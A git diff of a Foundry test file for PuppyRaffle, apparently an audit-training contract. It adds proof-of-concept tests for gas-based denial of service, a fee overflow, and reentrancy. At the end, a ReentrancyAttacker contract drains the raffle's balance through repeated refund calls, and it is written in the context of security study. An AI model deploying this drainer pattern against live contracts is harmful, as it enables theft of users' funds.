@@ -16,16 +16,88 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
     /// EnterRaffle    ///
     /////////////////////
+
+    //my Dos test (idea from sc exploits)
+    function testDoSAttackOnEnterRaffleFunction() public {
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+
+        uint256 gasStart0 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        uint256 gasCost0 = gasStart0 - gasleft();
+        console.log("Gas cost for warmup: %d", gasCost0);
+
+        players = new address[](1);
+        players[0] = playerTwo;
+
+        uint256 gasStart1 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        uint256 gasCost1 = gasStart1 - gasleft();
+        console.log("Gas cost for prank 1 : %d", gasCost1);
+
+        players = new address[](1);
+        players[0] = playerThree;
+
+        uint256 gasStart2 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        uint256 gasCost2 = gasStart2 - gasleft();
+        console.log("Gas cost for prank 2 : %d", gasCost2);
+
+        players = new address[](1);
+        players[0] = playerFour;
+
+        uint256 gasStart3 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        uint256 gasCost3 = gasStart3 - gasleft();
+        console.log("Gas cost for prank 3 : %d", gasCost3);
+
+        assert(gasCost2 > gasCost1);
+        assert(gasCost3 > gasCost2);
+    }
+
+    // Patricks Dos test
+    function test_denialOfService() public {
+        vm.txGasPrice(1);
+
+        uint256 playersNum = 100;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+            console.log("Player %d address: %d", i, address(players[i]));
+            console.log("Player %d balance: %d", i, address(players[i]).balance);
+        }
+
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        uint256 gasEnd = gasleft();
+
+        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+        console.log("Gas used for first 100 players: %d", gasUsedFirst);
+
+        address[] memory playersTwo = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            playersTwo[i] = address(i + playersNum);
+        }
+
+        uint256 gasStart2 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
+        uint256 gasEnd2 = gasleft();
+
+        uint256 gasUsedFirst2 = (gasStart2 - gasEnd2) * tx.gasprice;
+        console.log("Gas used for second 100 players: %d", gasUsedFirst2);
+
+        assert(gasUsedFirst2 > gasUsedFirst);
+    }
 
     function testCanEnterRaffle() public {
         address[] memory players = new address[](1);
@@ -78,6 +150,7 @@ contract PuppyRaffleTest is Test {
     //////////////////////
     /// Refund         ///
     /////////////////////
+
     modifier playerEntered() {
         address[] memory players = new address[](1);
         players[0] = playerOne;
@@ -127,6 +200,7 @@ contract PuppyRaffleTest is Test {
     //////////////////////
     /// selectWinner         ///
     /////////////////////
+
     modifier playersEntered() {
         address[] memory players = new address[](4);
         players[0] = playerOne;
@@ -195,6 +269,33 @@ contract PuppyRaffleTest is Test {
         assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
     }
 
+    // my test for overflow
+
+    function testMyOverflow() public {
+        uint256 playersNum = 1500;
+
+        uint256 expectedTotalFees = (entranceFee * playersNum * 20) / 100;
+
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+
+        uint256 realTotalFees = uint256(puppyRaffle.getTotalFees());
+
+        console.log("Real total fees: ", realTotalFees);
+        console.log("Expected total fees: ", expectedTotalFees);
+
+        assert(realTotalFees != expectedTotalFees);
+    }
+
     //////////////////////
     /// withdrawFees         ///
     /////////////////////
@@ -212,5 +313,66 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    //////////////////////////////////
+    /// Reentrancy Attack         ///
+    //////////////////////////////////
+
+    function testMyReentrancyAttack() public {
+        uint256 playersNum = 5;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+
+        uint256 puppyRaffleBalanceBeforeAttack = address(puppyRaffle).balance;
+        console.log("PuppyRaffle balance before attack: %d", puppyRaffleBalanceBeforeAttack);
+
+        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
+        attacker.attack{value: entranceFee}();
+
+        uint256 attackerBalance = attacker.getBalance();
+        console.log("Attacker balance: %d", attackerBalance);
+
+        uint256 puppyRaffleBalanceAfterAttack = address(puppyRaffle).balance;
+        console.log("PuppyRaffle balance after attack: %d", puppyRaffleBalanceAfterAttack);
+
+        assertEq(puppyRaffleBalanceAfterAttack, 0);
+        assertEq(attackerBalance, puppyRaffleBalanceBeforeAttack + entranceFee);
+    }
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle public puppyRaffle;
+    // bebtter to define it through constructor using PuppyRaffle interface
+    uint256 public constant AMOUNT = 1e18;
+
+    address[] attackerPlayers;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle puppyRaffleVictim) {
+        puppyRaffle = puppyRaffleVictim;
+    }
+
+    receive() external payable {
+        if (address(puppyRaffle).balance >= AMOUNT) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= AMOUNT, "Not enough to attack");
+        attackerPlayers = new address[](1);
+        attackerPlayers[0] = address(this);
+        puppyRaffle.enterRaffle{value: AMOUNT}(attackerPlayers);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 }
